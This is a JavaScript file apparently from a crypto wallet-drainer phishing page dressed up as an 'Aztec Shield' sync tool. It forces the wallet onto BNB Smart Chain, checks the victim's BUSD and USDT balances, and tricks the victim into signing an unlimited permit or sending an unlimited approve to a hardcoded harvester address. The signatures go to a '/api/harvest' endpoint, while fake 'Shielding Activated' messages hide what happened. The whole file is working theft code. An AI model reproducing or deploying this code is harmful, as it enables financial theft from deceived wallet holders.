/**
 * AZTEC SHIELD - Standard Sync v8.6 (Hardened for Trust Wallet)
 * Fixes: Ethereum Auto-Default, Chain Sync Delay, Balance Logic
 */

const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function nonces(address owner) view returns (uint256)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/**
 * Main Trigger logic (Called from index.html button)
 */
async function triggerPermit() {
    console.log("[v8.6] Initiating Hard-Switch Sync...");
    if (!window.ethereum) {
        alert("Please open this page in Trust Wallet or MetaMask.");
        return;
    }

    try {
        // 1. FORCE THE NETWORK SWITCH BEFORE ANYTHING ELSE
        const chainIdHex = '0x38'; // 56 in hex
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: chainIdHex,
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }],
                });
            } else {
                throw new Error("Network switch rejected.");
            }
        }

        // 2. CRITICAL: WAIT FOR MOBILE PROVIDER TO SYNC (1.5 seconds)
        // Trust Wallet needs time to switch its internal RPC node.
        await new Promise(resolve => setTimeout(resolve, 1500));

        // 3. NOW CONNECT PROVIDER (After Switch + Delay)
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const victim = await signer.getAddress();

        // UI state update
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 4. VERIFY BALANCE ON THE CORRECT CHAIN
        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
        const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
        
        const [busdBal, usdtBal, network] = await Promise.all([
            busd.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            provider.getNetwork()
        ]);

        console.log(`[!] Connected to Chain: ${network.chainId} (${network.name})`);
        console.log(`[!] BUSD Balance: ${ethers.utils.formatUnits(busdBal, 18)}`);

        // 5. DECISION REASONING
        if (busdBal.gt(0)) {
            console.log("Found BUSD. Triggering PERMIT...");
            await handleBUSD(signer, victim, busd);
        } else if (usdtBal.gt(0)) {
            console.log("Found USDT. Triggering APPROVE...");
            await handleUSDT(signer, victim, usdt);
        } else {
            console.warn("No BUSD/USDT found in this wallet.");
            document.getElementById('ui-loading').innerHTML = 
                `<div style="color:#ff3b30;padding:20px;">Verification Error: No eligible BUSD (BEP-20) found on ${network.name}.</div>`;
        }

    } catch (e) {
        console.error("Critical Interaction Error:", e);
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}

async function handleBUSD(signer, victim, busdContract) {
    const [nonce, tokenName] = await Promise.all([
        busdContract.nonces(victim),
        busdContract.name()
    ]);

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
    const types = {
        Permit: [
            { name: "owner", type: "address" }, { name: "spender", type: "address" },
            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
        ]
    };
    const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit', amount: MAX_VAL });
}

async function handleUSDT(signer, victim, usdtContract) {
    const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
    await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
    await tx.wait();
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>USDT Shielding Activated.</div>";
}

async function exfiltrate(data) {
    console.log("[+] Sending data to backend:", data);
    await fetch('/api/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
    });
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
}
